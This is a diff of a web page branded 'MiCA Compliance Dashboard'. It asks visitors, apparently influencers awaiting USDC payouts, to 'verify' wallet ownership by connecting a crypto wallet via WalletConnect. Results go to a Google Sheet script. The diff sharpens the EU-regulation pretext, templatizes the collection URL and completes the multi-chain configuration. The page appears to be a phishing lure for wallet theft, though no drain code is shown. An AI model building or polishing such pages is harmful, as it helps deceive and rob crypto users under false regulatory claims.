@@ -29,7 +29,7 @@
 
 <div class="container">
   <h2>USDC Wallet Verification</h2>
-  <p>To comply with EU MiCA/TFR rules, please verify your wallet ownership using any mobile crypto wallet. This process is secure and completely free.</p>
+  <p>To comply with EU MiCA/TFR rules for payouts <strong>above €1,000</strong>, please verify your wallet ownership using any mobile crypto wallet. This process is secure and completely free.</p>
   
   <div class="input-group">
     <label for="kolName">Your Name / Channel Name</label>
@@ -54,9 +54,9 @@
 <script>
 // ==================== CONFIGURATION ====================
 // 1. PASTE YOUR GOOGLE SHEET WEB APP URL HERE:
-const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxKa5YTyB8puc6TLW2I5fZOv9KY1KO9hHlOD_HVozj0j8NzZ7_9J6D8ZYES00xZt9RoBg/exec";
+const GOOGLE_SCRIPT_URL = "YOUR_GOOGLE_SCRIPT_URL_HERE";
 
-// 2. PUBLIC FREE WALLETCONNECT INSTANCE PROJECT ID (DO NOT CHANGE):
+// 2. PUBLIC FREE WALLETCONNECT INSTANCE PROJECT ID:
 const WALLETCONNECT_PROJECT_ID = "c4a7e93736780c850787e9eb0ef6e384";
 // ========================================================
 
@@ -66,15 +66,20 @@ let modalInstance = null;
 function initWalletModal() {
   if (modalInstance) return modalInstance;
   
-const mainnetMetadata = {
-  name: 'MiCA Compliance Dashboard',
-  description: 'Wallet Verification Portal',
-  url: 'https://whateverdigital.co', // <-- UPDATED FOR YOUR NEW SUBDOMAIN
-  icons: ['https://githubusercontent.com']
-};
+  const mainnetMetadata = {
+    name: 'MiCA Compliance Dashboard',
+    description: 'Wallet Verification Portal',
+    url: 'https://whateverdigital.co',
+    icons: ['https://githubusercontent.com']
+  };
 
   // Configure target verification networks for your USDC selections
-  const chains =; // Ethereum, Polygon, Arbitrum, Base IDs
+  const chains = [
+    window.Web3ModalEthers5.Mainnet,
+    window.Web3ModalEthers5.Polygon,
+    window.Web3ModalEthers5.Arbitrum,
+    window.Web3ModalEthers5.Base
+  ];
 
   modalInstance = window.Web3ModalEthers5.createWeb3Modal({
     ethersConfig: window.Web3ModalEthers5.defaultEthersConfig({ metadata: mainnetMetadata }),
